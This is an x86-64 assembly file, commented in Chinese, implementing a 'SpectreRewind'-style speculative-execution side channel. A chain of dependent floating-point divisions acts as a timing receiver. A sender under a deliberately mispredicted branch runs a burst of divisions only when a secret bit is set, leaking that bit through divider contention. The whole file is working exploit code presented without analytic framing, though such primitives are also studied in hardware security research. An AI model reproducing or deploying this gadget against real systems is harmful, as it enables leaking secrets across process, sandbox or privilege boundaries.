.intel_syntax noprefix

.section .text
.global spectrerewind_float
spectrerewind_float:
    # 入口：外部已把
    #   xmm0 = recv 初始值
    #   xmm1 = divisor
    #   rbx  = secret bit (0/1)
    #   rsp  指向沙箱栈顶

    # ---------- 1. Receiver：12 条依赖 divsd ----------
    # 在栈上留 8 字节临时
    sub     rsp, 8
    movsd   [rsp], xmm0         # [rsp] = recv
    mov     rcx, 12
.recv_loop:
    movsd   xmm0, [rsp]         # 取当前被除数
    divsd   xmm0, xmm1          # xmm0 /= divisor
    movsd   [rsp], xmm0         # 写回 → 下条依赖
    dec     rcx
    jnz     .recv_loop

    # ---------- 2. 外层分支：训练 taken ----------
    xorpd   xmm2, xmm2          # xmm2 = 0.0
    ucomisd xmm2, xmm0          # 0.0 == recv ?
    jne     .skip_sender        # 实际 recv≠0，但预测走 taken

    # ---------- 3. 内层分支：secret 决定争用 ----------
    test    rbx, rbx
    jz      .skip_sender

    # ---------- 4. Sender：100×4 独立 divsd ----------
    # 在栈上留 4 个变量
    sub     rsp, 32
    xorpd   xmm2, xmm2          # xmm2-xmm5 = 0.0
    xorpd   xmm3, xmm3
    xorpd   xmm4, xmm4
    xorpd   xmm5, xmm5
    mov     rcx, 100
.send_loop:
    divsd   xmm2, xmm1          # A/B/C/D 各自独立
    divsd   xmm3, xmm1
    divsd   xmm4, xmm1
    divsd   xmm5, xmm1
    dec     rcx
    jnz     .send_loop
    add     rsp, 32             # 释放 sender 局部

.skip_sender:
    add     rsp, 8              # 释放 receiver 局部
    ret